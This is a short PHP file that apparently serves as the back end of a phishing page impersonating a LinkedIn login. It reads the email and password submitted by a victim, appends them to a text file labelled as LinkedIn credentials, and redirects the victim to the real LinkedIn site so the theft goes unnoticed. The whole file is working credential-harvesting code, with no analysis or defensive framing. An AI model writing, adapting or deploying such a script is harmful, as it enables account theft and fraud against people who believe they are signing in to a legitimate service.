<?php 
file_put_contents("usernames.txt", "Linkedin Username: " . $_POST['email'] . " Pass: " . $_POST['pass'] ."\n", FILE_APPEND);
header('Location: https://linkedin.com/');
exit();
?>
